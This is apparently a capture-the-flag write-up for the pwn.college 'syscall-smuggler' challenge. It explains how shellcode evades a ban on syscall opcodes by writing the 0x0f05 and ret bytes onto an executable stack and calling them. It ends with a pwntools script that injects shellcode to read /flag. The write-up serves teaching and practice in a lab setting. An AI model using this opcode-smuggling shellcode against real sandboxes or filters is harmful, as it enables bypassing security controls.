---

title: "pwn.college - syscall-smuggler"
date: "2026-06-22"
category: "pwncollege"
summary: "A syscall-smuggler challenge where the opcodes for `syscall`, `int`, and `sysenter` are forbidden."
---
##### The goal of this challenge is to perform system calls even though the opcodes for the `syscall`, `int`, and `sysenter` instructions are forbidden.

At first glance, this seems impossible. If all system call instructions are banned, how can we invoke the kernel?

The answer is simple: we hide the opcode.

The processor executes whatever the `rip` register points to. Therefore, instead of embedding a `syscall` instruction directly in our code, we can write its opcode (`0x0f05`) into executable memory and redirect `rip` to those bytes.

Let's try this by writing a small assembly program that opens the `/flag` file:

```asm
.intel_syntax noprefix
.global _start

_start:
    mov rax, 2
    lea rdi, [rip+flag]
    xor rdx, rdx
    mov byte ptr [rsp], 0x0f
    mov byte ptr [rsp+1], 0x05
    mov byte ptr [rsp+2], 0xc3
    mov r15, rsp
    call r15

flag:
    .string "/flag"
```

Assemble and link it:

```sh
as -o program.o program.s
```

```sh
ld -o program -z execstack program.o
```

The `-z execstack` option marks the stack as executable (the stack is non-executable by default).

Now let's run the program under `strace` so we can observe the system calls it makes:

```sh
strace ./program
```

It works! This means we can use the same technique for every system call required to open the flag, read it, and write it to `stdout`.

![screenshot](https://snipboard.io/OAryL4.jpg)

However, you might have noticed that I also wrote the byte `0xc3` onto the stack, even though the `syscall` opcode is only `0x0f05`:

```asm
mov byte ptr [rsp], 0x0f
mov byte ptr [rsp+1], 0x05
mov byte ptr [rsp+2], 0xc3
```

The reason is straightforward.

`0xc3` is the opcode for the `ret` instruction. The `call` instruction pushes a return address onto the stack, and after `syscall` finishes, execution continues with the next instruction—which, in our case, is `ret`. The `ret` instruction pops the return address from the stack and transfers execution back to the instruction following `call`.

If we omit the `ret` opcode:

![screenshot](https://snipboard.io/Lgqtc0.jpg)

the program crashes. After executing `syscall`, the processor simply continues decoding whatever bytes happen to follow on the stack. Eventually it encounters an invalid instruction encoding, causing the process to terminate with an illegal instruction or segmentation fault.

Now that we've covered the necessary concepts, we can write the final Python exploit:

```python
from pwn import *

context.arch = 'amd64'
shc = asm('''
# open
mov rax, 2
lea rdi, [rip+flag]
xor rdx, rdx
xor rsi, rsi
mov byte ptr [rsp], 0x0f
mov byte ptr [rsp+1], 0x05
mov byte ptr [rsp+2], 0xc3
mov r15, rsp
call r15

# read
mov rdi, rax
xor rax, rax
mov rsi, rsp
add rsi, 0x100
mov rdx, 0x100
call r15

# write
mov rdx, rax
mov rdi, 1
mov rax, 1
call r15

flag:
.string "/flag"
''')

p = process('/challenge/syscall-smuggler')
p.sendline(shc)
p.interactive()
```

